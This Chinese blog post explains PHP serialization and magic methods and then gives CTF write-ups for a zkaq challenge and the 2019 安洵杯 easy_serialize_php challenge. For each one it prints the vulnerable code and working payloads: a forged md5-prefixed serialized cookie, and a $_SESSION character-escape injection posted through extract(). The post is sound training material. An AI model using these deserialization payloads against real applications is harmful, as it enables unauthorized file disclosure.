    <content><![CDATA[<h3 id="序列化-与-反序列化"><a href="#序列化-与-反序列化" class="headerlink" title="序列化 与 反序列化"></a>序列化 与 反序列化</h3><p>序列化: 把对象转换为字符序列的过程<br>反序列化: 把字符序列恢复为对象的过程  </p>
<p><code>serialize()</code><br><code>unserialize()</code></p>
<h3 id="php序列化"><a href="#php序列化" class="headerlink" title="php序列化"></a>php序列化</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a - array                 	b - boolean  </span><br><span class="line">d - double                 	i - integer</span><br><span class="line">o - common object         	r - reference</span><br><span class="line">s - string                 	C - custom object</span><br><span class="line">O - class                  	N - null</span><br><span class="line">R - pointer reference      	U - unicode string</span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$sites</span> = <span class="keyword">array</span>(<span class="string">&#x27;Dog&#x27;</span>, <span class="string">&#x27;Cat&#x27;</span>, <span class="string">&#x27;Zard&#x27;</span>);</span><br><span class="line"><span class="variable">$serialized_data</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$sites</span>);</span><br><span class="line"><span class="keyword">echo</span>  <span class="variable">$serialized_data</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">a:<span class="number">3</span>:&#123;i:<span class="number">0</span>;s:<span class="number">3</span>:<span class="string">&quot;Dog&quot;</span>;i:<span class="number">1</span>;s:<span class="number">3</span>:<span class="string">&quot;Cat&quot;</span>;i:<span class="number">2</span>;s:<span class="number">4</span>:<span class="string">&quot;Zard&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$name</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$age</span> = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">Show_info</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		<span class="keyword">echo</span>  <span class="variable language_">$this</span>-&gt;name .<span class="string">&#x27; is &#x27;</span>. <span class="variable language_">$this</span>-&gt;age .<span class="string">&#x27;years old.&lt;br/&gt;&#x27;</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$s</span> = <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line"><span class="variable">$s</span>-&gt;name = <span class="string">&#x27;Mamor&#x27;</span> ;</span><br><span class="line"><span class="variable">$s</span>-&gt;age = <span class="number">21</span>;</span><br><span class="line"><span class="variable">$s</span>-&gt;<span class="title function_ invoke__">Show_info</span>();</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$s</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br/&gt;&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">unserialize</span>(<span class="string">&#x27;O:4:&quot;User&quot;:2:&#123;s:4:&quot;name&quot;;s:5:&quot;Mamor&quot;;s:3:&quot;age&quot;;i:21;&#125;&#x27;</span>));</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> Mamor is <span class="number">21</span>years old.</span><br><span class="line">O:<span class="number">4</span>:<span class="string">&quot;User&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;name&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;Mamor&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;age&quot;</span>;i:<span class="number">21</span>;&#125;</span><br><span class="line">User <span class="title function_ invoke__">Object</span> ( [name] =&gt; Mamor [age] =&gt; <span class="number">21</span> )</span><br></pre></td></tr></table></figure>

<p><code>a:3:&#123;i:0;s:3:&quot;Dog&quot;;i:1;s:3:&quot;Cat&quot;;i:2;s:4:&quot;Zard&quot;;&#125;</code></p>
<p><code>对象类型:长度:&#123;长度:类型:值,长度:类型:值,长度:类型:值&#125;</code></p>
<p><code>O:4:&quot;User&quot;:2:&#123;s:4:&quot;name&quot;;s:5:&quot;Mamor&quot;;s:3:&quot;age&quot;;i:21;&#125;</code></p>
<p><code>对象类型:长度:类名：类中变量个数:&#123;类型：长度：值，类型：长度：值，类型：长度：值&#125;</code><br><br></p>
<h3 id="魔术方法"><a href="#魔术方法" class="headerlink" title="魔术方法"></a>魔术方法</h3><p><a href="https://segmentfault.com/a/1190000007250604">PHP之十六个魔术方法详解</a></p>
<blockquote>
<p>__construct()    当一个对象创建时被调用<br>__destruct()        当一个对象销毁时被调用<br>__toString()        当反序列化后的对象被输出的时候(转化为字符串的时候)被调用<br>__sleep()             在对象在被序列化之前被调用<br>__wakeup            在序列化之后立即被调用</p>
</blockquote>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$a</span> = <span class="string">&#x27;aaaaa&lt;br/&gt;&#x27;</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$b</span> = <span class="string">&#x27;bbbbb&lt;br/&gt;&#x27;</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">aaa</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;a;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&#x27; __construct&lt;br/&gt;&#x27;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span>  <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&#x27; __destruct()&lt;br/&gt;&#x27;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&#x27;__wakeup()&lt;br/&gt;&#x27;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&#x27;__sleep()&lt;br/&gt;&#x27;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&#x27;&lt;br/&gt;&#x27;</span>;</span><br><span class="line">	<span class="comment">// 创建对象时会调用 __construct()</span></span><br><span class="line">	<span class="variable">$obj</span> = <span class="keyword">new</span> <span class="title function_ invoke__">test</span>();  </span><br><span class="line"></span><br><span class="line">	<span class="variable">$serialize</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$obj</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&#x27;serialize: &#x27;</span> .<span class="variable">$serialize</span>. <span class="string">&#x27;&lt;br/&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">	<span class="variable">$unserialize</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$serialize</span>);</span><br><span class="line"></span><br><span class="line">	<span class="variable">$obj</span>-&gt;<span class="title function_ invoke__">aaa</span>();</span><br><span class="line"></span><br><span class="line">	<span class="comment">//对象销毁时会调用 __destruct</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">输出：</span><br><span class="line">__construct</span><br><span class="line"><span class="title function_ invoke__">__sleep</span>()</span><br><span class="line">serialize: N;</span><br><span class="line">aaaaa</span><br><span class="line"><span class="title function_ invoke__">__destruct</span>()</span><br></pre></td></tr></table></figure>

<br>

<h3 id="zkaq靶场题目"><a href="#zkaq靶场题目" class="headerlink" title="zkaq靶场题目"></a>zkaq靶场题目</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">flag in ./flag.php </span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">Class readme&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">highlight_file</span>(<span class="string">&#x27;Readme.txt&#x27;</span>, <span class="literal">true</span>).<span class="title function_ invoke__">highlight_file</span>(<span class="variable">$this</span>-&gt;source, <span class="literal">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;source&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$s</span> = <span class="keyword">new</span> <span class="title function_ invoke__">readme</span>();</span><br><span class="line">    <span class="variable">$s</span>-&gt;source = <span class="keyword">__FILE__</span>;  <span class="comment">//这里存在可控参数，可以尝试构造序列化对象flag.php</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$s</span>;</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//$todos = [];</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;todos&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_COOKIE</span>[<span class="string">&#x27;todos&#x27;</span>];</span><br><span class="line">    <span class="variable">$h</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$c</span>, <span class="number">0</span>, <span class="number">32</span>);</span><br><span class="line">    <span class="variable">$m</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$c</span>, <span class="number">32</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$m</span>) === <span class="variable">$h</span>)&#123;</span><br><span class="line">        <span class="variable">$todos</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$m</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//$c=$h+$m=md5(m)+$m</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;text&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$todo</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;text&#x27;</span>];</span><br><span class="line">    <span class="variable">$todos</span>[] = <span class="variable">$todo</span>;</span><br><span class="line">    <span class="variable">$m</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$todos</span>);</span><br><span class="line">    <span class="variable">$h</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$m</span>);</span><br><span class="line">    <span class="title function_ invoke__">setcookie</span>(<span class="string">&#x27;todos&#x27;</span>, <span class="variable">$h</span>.<span class="variable">$m</span>);</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location: &#x27;</span>.<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_URI&#x27;</span>]);</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;h1&gt;Readme&lt;/h1&gt;</span><br><span class="line">&lt;a href=<span class="string">&quot;?source&quot;</span>&gt;&lt;h2&gt;Check Code&lt;/h2&gt;&lt;/a&gt;</span><br><span class="line">&lt;ul&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">foreach</span>(<span class="variable">$todos</span> <span class="keyword">as</span> <span class="variable">$todo</span>):<span class="meta">?&gt;</span></span><br><span class="line">    &lt;li&gt;<span class="meta">&lt;?=</span><span class="variable">$todo</span><span class="meta">?&gt;</span>&lt;/li&gt;           <span class="comment">//  &lt;=== &lt;?php echo $todo ?&gt;的简写</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">endforeach</span>;<span class="meta">?&gt;</span></span><br><span class="line">&lt;/ul&gt;</span><br><span class="line"></span><br><span class="line">&lt;form method=<span class="string">&quot;post&quot;</span> href=<span class="string">&quot;.&quot;</span>&gt;</span><br><span class="line">    &lt;textarea name=<span class="string">&quot;text&quot;</span>&gt;&lt;/textarea&gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;store&quot;</span>&gt;</span><br><span class="line">&lt;/form&gt; </span><br></pre></td></tr></table></figure>

<p>payload</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">Class readme&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="title function_ invoke__">highlight_file</span>(<span class="string">&#x27;readme.txt&#x27;</span>,<span class="literal">true</span>).<span class="title function_ invoke__">highlight_file</span>(<span class="variable">$this</span>-&gt;source);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;source&#x27;</span>]))&#123;</span><br><span class="line"><span class="variable">$s</span> = <span class="keyword">new</span> <span class="title function_ invoke__">readme</span>();</span><br><span class="line"><span class="variable">$s</span> -&gt;source = <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"><span class="variable">$s</span> = [<span class="variable">$s</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$s</span>)).<span class="title function_ invoke__">serialize</span>(<span class="variable">$s</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>得到<code>e2d4f7dcc43ee1db7f69e76303d0105ca:1:&#123;i:0;O:6:&quot;readme&quot;:1:&#123;s:6:&quot;source&quot;;s:8:&quot;flag.php&quot;;&#125;&#125;</code>先进行一次url编码然后使用cookie传参</p>
<p><code>todos=e2d4f7dcc43ee1db7f69e76303d0105ca%3A1%3A%7Bi%3A0%3BO%3A6%3A%22readme%22%3A1%3A%7Bs%3A6%3A%22source%22%3Bs%3A8%3A%22flag.php%22%3B%7D%7D</code>最终得到<code>zkz&#123;UNs_what_what?&#125;</code></p>
<br>

<h3 id="安洵杯-2019-easy-serialize-php1"><a href="#安洵杯-2019-easy-serialize-php1" class="headerlink" title="[安洵杯 2019]easy_serialize_php1"></a>[安洵杯 2019]easy_serialize_php1</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$function</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;f&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$img</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$filter_arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;php&#x27;</span>,<span class="string">&#x27;flag&#x27;</span>,<span class="string">&#x27;php5&#x27;</span>,<span class="string">&#x27;php4&#x27;</span>,<span class="string">&#x27;fl1g&#x27;</span>);</span><br><span class="line">    <span class="variable">$filter</span> = <span class="string">&#x27;/&#x27;</span>.<span class="title function_ invoke__">implode</span>(<span class="string">&#x27;|&#x27;</span>,<span class="variable">$filter_arr</span>).<span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$filter</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$img</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SESSION</span>)&#123;</span><br><span class="line">    <span class="keyword">unset</span>(<span class="variable">$_SESSION</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&quot;user&quot;</span>] = <span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;function&#x27;</span>] = <span class="variable">$function</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">extract</span>(<span class="variable">$_POST</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$function</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;a href=&quot;index.php?f=highlight_file&quot;&gt;source_code&lt;/a&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$_GET</span>[<span class="string">&#x27;img_path&#x27;</span>])&#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;img&#x27;</span>] = <span class="title function_ invoke__">base64_encode</span>(<span class="string">&#x27;guest_img.png&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;img&#x27;</span>] = <span class="title function_ invoke__">sha1</span>(<span class="title function_ invoke__">base64_encode</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;img_path&#x27;</span>]));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$serialize_info</span> = <span class="title function_ invoke__">filter</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$_SESSION</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">&#x27;highlight_file&#x27;</span>)&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">&#x27;phpinfo&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&#x27;phpinfo();&#x27;</span>); <span class="comment">//maybe you can find something in here!</span></span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">&#x27;show_image&#x27;</span>)&#123;</span><br><span class="line">    <span class="variable">$userinfo</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$serialize_info</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$userinfo</span>[<span class="string">&#x27;img&#x27;</span>]));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>如果 $function = phpinfo 会得到phpinfo页面，得到了flag文件名为 d0g3_f1ag.php    ，想办法去读取flag文件去得到flag</p>
<p>后面的wp看了下师傅们的wp，使用的字符逃逸</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$str1</span>=<span class="string">&#x27;a:2:&#123;i:0;s:5:&quot;Mamor&quot;;i:1;s:5:&quot;aaaaa&quot;;&#125;&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">unserialize</span>(<span class="variable">$str1</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br/&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;含有垃圾参数的:&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br/&gt;&#x27;</span>;</span><br><span class="line"><span class="variable">$str2</span>=<span class="string">&#x27;a:2:&#123;i:0;s:5:&quot;Mamor&quot;;i:1;s:5:&quot;aaaaa&quot;;&#125;aaa垃圾参数w(ﾟДﾟ)w&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">unserialize</span>(<span class="variable">$str2</span>));</span><br><span class="line"><span class="keyword">array</span>(<span class="number">2</span>) &#123; [<span class="number">0</span>]=&gt; <span class="keyword">string</span>(<span class="number">5</span>) <span class="string">&quot;Mamor&quot;</span> [<span class="number">1</span>]=&gt; <span class="keyword">string</span>(<span class="number">5</span>) <span class="string">&quot;aaaaa&quot;</span> &#125;</span><br><span class="line">含有垃圾参数的:</span><br><span class="line"><span class="keyword">array</span>(<span class="number">2</span>) &#123; [<span class="number">0</span>]=&gt; <span class="keyword">string</span>(<span class="number">5</span>) <span class="string">&quot;Mamor&quot;</span> [<span class="number">1</span>]=&gt; <span class="keyword">string</span>(<span class="number">5</span>) <span class="string">&quot;aaaaa&quot;</span> &#125; </span><br></pre></td></tr></table></figure>

<p>可以看到就算是有垃圾参数，在进行反序列化的时候也不会出现，不会影响反序列化正常运行</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?</span> php</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SESSION</span>)&#123;</span><br><span class="line">    <span class="keyword">unset</span>(<span class="variable">$_SESSION</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&quot;user&quot;</span>] = <span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;function&#x27;</span>] = <span class="variable">$function</span>;</span><br></pre></td></tr></table></figure>

<p>清空$_SESSION变量值，并重新赋值</p>
<p><code>extract($_POST);</code>对post传参进行了变量覆盖</p>
<p>后续可以只看这些代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$function</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;f&#x27;</span>];</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$img</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$filter_arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;php&#x27;</span>,<span class="string">&#x27;flag&#x27;</span>,<span class="string">&#x27;php5&#x27;</span>,<span class="string">&#x27;php4&#x27;</span>,<span class="string">&#x27;fl1g&#x27;</span>);</span><br><span class="line">    <span class="variable">$filter</span> = <span class="string">&#x27;/&#x27;</span>.<span class="title function_ invoke__">implode</span>(<span class="string">&#x27;|&#x27;</span>,<span class="variable">$filter_arr</span>).<span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$filter</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$img</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">... </span><br><span class="line"><span class="variable">$serialize_info</span> = <span class="title function_ invoke__">filter</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$_SESSION</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">&#x27;highlight_file&#x27;</span>)&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">&#x27;phpinfo&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&#x27;phpinfo();&#x27;</span>); <span class="comment">//maybe you can find something in here!</span></span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">&#x27;show_image&#x27;</span>)&#123;</span><br><span class="line">    <span class="variable">$userinfo</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$serialize_info</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$userinfo</span>[<span class="string">&#x27;img&#x27;</span>]));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在filter()函数中过滤掉了php,flag,php5,php4,fl1g</p>
<p>file_get_contents()函数可以将整个文件读入一个字符串， 让base64编码的值为flag的所在文件名 ，</p>
<p>即d0g3_f1ag.php–&gt;base64编码后为 <code>ZDBnM19mMWFnLnBocA==</code>(20位) 反序列化后为 <code>s:3:&quot;img&quot;,s:20,&quot;ZDBnM19mMWFnLnBocA==&quot;</code></p>
<p>看了下Leena_c9a7师傅的wp，当后台如果存在过滤的话 $_SESSION数组的键值会发生变化，既然无法去控制img的值，就可以利用这道题目本身的过滤器，</p>
<p><code>post:_SESSION[flagflag]=&quot;;s:3:&quot;aaa&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;</code></p>
<p><code>s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;</code>是预期输出的序列化字符</p>
<p><img src="/posts/7c19cc12/1.PNG"></p>
<p>经过filter过滤玩之后 flagflag会替换为空</p>
<p><code>a:2:&#123;s:8:&quot;flagflag&quot;;s:51:&quot;&quot;;s:3:&quot;aaa&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;&quot;;s:3:&quot;img&quot;;s:20:&quot;Z3Vlc3RfaW1nLnBuZw==&quot;;&#125;</code>变为</p>
<p><code>a:2:&#123;s:8:&quot;&quot;;s:51:&quot;&quot;;s:3:&quot;aaa&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;&quot;;s:3:&quot;img&quot;;s:20:&quot;Z3Vlc3RfaW1nLnBuZw==&quot;;&#125;</code></p>
<p><code>s:8:&quot;&quot;;s:51:&quot;&quot;;s:3:&quot;aaa&quot;</code> 这样这里的s:8的值为<code>&quot;;s:51:&quot;</code></p>
<p>a:2:{s:8:”<em><strong>“;s:51:”</strong></em>“;s:3:”aaa”;s:3:”img”;s:20:”ZDBnM19mMWFnLnBocA==”;}”;s:3:”img”;s:20:”Z3Vlc3RfaW1nLnBuZw==”;}</p>
<p>这样两对键值为 <code>&quot;;s:51:&quot;</code> <code>aaa</code>   和 <code>img</code> <code>ZDBnM19mMWFnLnBocA==</code> }后面的内容</p>
<p><code>&quot;;s:3:&quot;img&quot;;s:20:&quot;Z3Vlc3RfaW1nLnBuZw==&quot;;&#125;</code>均会当作垃圾参数忽略掉</p>
<p><img src="/posts/7c19cc12/2.PNG"></p>
<p>这样 file_get_contents()读取<code>d0g3_f1ag.php</code>的内容</p>
<p><strong>payload</strong></p>
<blockquote>
<p>GET         f=show_image</p>
<p>POST    _SESSION[flagflag]=”;s:3:”aaa”;s:3:”img”;s:20:”ZDBnM19mMWFnLnBocA==”;}</p>
</blockquote>
<p>查看源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$flag</span> = <span class="string">&#x27;flag in /d0g3_fllllllag&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>base64(d0g3_fllllllag) = L2QwZzNfZmxsbGxsbGFn</p>
<p>payload</p>
<blockquote>
<p>GET         f=show_image</p>
<p>POST    _SESSION[flagflag]=”;s:3:”aaa”;s:3:”img”;s:20:”L2QwZzNfZmxsbGxsbGFn”;}    </p>
</blockquote>
<p>得到flag<code>flag&#123;7d55f960-c93d-4db0-8524-f51d073ce4db&#125;</code></p>
<p><img src="/posts/7c19cc12/3.PNG"></p>
<br>

<h3 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h3><blockquote>
<p><a href="https://xz.aliyun.com/t/6753">https://xz.aliyun.com/t/6753</a></p>
<p><a href="https://segmentfault.com/a/1190000007250604">https://segmentfault.com/a/1190000007250604</a></p>
<p><a href="https://www.jianshu.com/p/8e8117f9fd0e">https://www.jianshu.com/p/8e8117f9fd0e</a></p>
<p><a href="https://www.cnblogs.com/h3zh1/p/12732336.html">https://www.cnblogs.com/h3zh1/p/12732336.html</a></p>
</blockquote>
]]></content>
      <categories>
        <category>反序列化</category>
      </categories>
      <tags>
        <tag>反序列化</tag>
      </tags>
  </entry>
  <entry>
